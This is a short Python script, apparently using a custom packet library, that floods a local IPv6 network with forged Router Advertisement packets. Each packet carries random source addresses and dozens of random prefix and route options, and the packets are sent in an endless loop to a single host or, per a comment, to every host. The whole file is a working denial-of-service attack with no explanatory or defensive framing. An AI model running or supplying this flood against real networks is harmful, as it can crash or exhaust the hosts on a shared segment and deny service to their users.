from All import *

tgt = generateSoliAddr("fe80::6c7e:4127:c6f:f67a")  # or just ff02::1, which is every host
print(tgt)

while True:
    packets = []
    for _ in range(1000):
        srcmac = randomMac()
        psrc = randomIpv6(isLocal=True)
        prefixes = [randomIpv6(isPrefix=True) for _ in range(24)]

        options = [
            NdpMTUOption(mtu=1500),
            NdpLLAddrOption(issrc=True, addr=srcmac),
            *[NdpPrefixInfoOption(64, 1, 1, 1, 10000, 1000, prefix) for prefix in prefixes],
            *[NdpRouteInfoOption(64, 1, 10000, prefix) for prefix in prefixes],
        ]

        pkt = Ether(src=srcmac, dst="33:33:00:00:00:01")/IPv6(psrc=psrc, pdst=tgt, hoplimit=255)/NDPRouterAdv("", "", options=options, curhoplimit=255,
                                                                                                              lifetime=10000, reachabletime=3145728, retranstime=1966080)
        packets.append(pkt)
    for pkt in packets:
        send(pkt)
